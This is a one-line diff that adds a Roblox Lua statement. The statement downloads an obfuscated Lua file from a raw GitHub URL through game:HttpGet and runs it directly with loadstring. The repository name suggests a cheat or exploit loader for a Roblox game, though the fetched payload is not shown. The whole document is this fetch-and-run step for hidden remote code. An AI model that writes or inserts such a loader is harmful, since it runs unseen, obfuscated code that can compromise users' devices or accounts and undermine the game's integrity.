@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkindigo12/Fuck-tsb/refs/heads/main/obfuscated.lua.txt"))()
